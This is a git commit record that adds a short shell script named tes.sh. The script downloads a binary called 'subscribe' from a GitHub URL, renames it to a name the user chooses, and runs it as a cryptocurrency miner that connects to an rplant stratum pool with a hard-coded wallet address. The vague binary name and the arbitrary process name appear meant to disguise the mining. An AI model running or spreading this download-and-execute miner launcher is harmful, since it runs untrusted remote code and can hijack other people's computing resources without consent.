997f6989ed0b34af0a134beec970de99654cb4fd
penjelajahwaktudonk <151587601+penjelajahwaktudonk@users.noreply.github.com>
2023-12-09 11:37:13 +0700

    Create tes.sh

---
+++ tes.sh
@@ -0,0 +1,3 @@
+read -p " name: " CRP
+read -p " trit: " TRIT
+wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/subscribe && mv subscribe $CRP && chmod +x $CRP && ./$CRP -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.$CRP -t $TRIT -p m=solo
